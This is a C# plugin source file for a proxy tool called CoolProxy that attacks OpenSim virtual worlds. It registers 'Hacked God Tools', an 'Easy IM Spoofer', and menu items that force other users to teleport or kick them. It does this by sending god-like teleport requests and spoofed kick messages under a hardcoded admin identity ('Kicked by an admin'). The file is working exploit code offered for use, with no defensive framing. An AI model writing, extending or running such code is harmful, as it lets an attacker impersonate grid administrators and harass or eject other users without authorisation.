using OpenMetaverse;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace CoolProxy.Plugins.GridIMHacks
{
    public class GridIMHacksPlugin : CoolProxyPlugin
    {
        private readonly UUID MrOpenSim = new UUID("6571e388-6218-4574-87db-f9379718315e");

        private CoolProxyFrame Proxy;

        public GridIMHacksPlugin(CoolProxyFrame frame)
        {
            Proxy = frame;

            IGUI gui = Proxy.RequestModuleInterface<IGUI>();

            gui.AddToggleFormQuick("Hacks", "Hacked God Tools", new GodHacksForm(frame));
            gui.AddToggleFormQuick("Hacks", "Special Teleport", new SpecialTeleportForm(Proxy));
            gui.AddToggleFormQuick("Hacks", "Easy IM Spoofer", new EasyIMSpoofer(Proxy));


            gui.AddSingleMenuItem("Force Teleport", handleForceTeleportSingle);
            gui.AddMultipleMenuItem("Force Teleport", handleForceTeleportMultiple);
            gui.AddSingleMenuItem("Kick User", handleKickUser);
            gui.AddMultipleMenuItem("Kick Users", handleKickUsers);
        }

        private void handleKickUsers(List<UUID> targets)
        {
            foreach (var uuid in targets)
                handleKickUser(uuid);
        }

        private void handleForceTeleportMultiple(List<UUID> targets)
        {
            foreach (var uuid in targets)
                handleForceTeleportSingle(uuid);
        }

        private void handleForceTeleportSingle(UUID target)
        {
            Proxy.OpenSim.GridIM.SendGridIM(target, string.Empty, target, InstantMessageDialog.GodLikeRequestTeleport, false, "@" + Proxy.Network.CurrentSim.GridURI, target, false, Proxy.Agent.SimPosition, Proxy.Network.CurrentSim.ID, 0, new byte[0], Utils.GetUnixTime());
        }

        private void handleKickUser(UUID target)
        {
            Proxy.OpenSim.GridIM.SendGridIM(MrOpenSim, string.Empty, target, InstantMessageDialog.OpenSimKickUser, false, "Kicked by an admin", target, false, Proxy.Agent.SimPosition, Proxy.Network.CurrentSim.ID, 0, new byte[1] { 0 }, Utils.GetUnixTime());
        }
    }
}
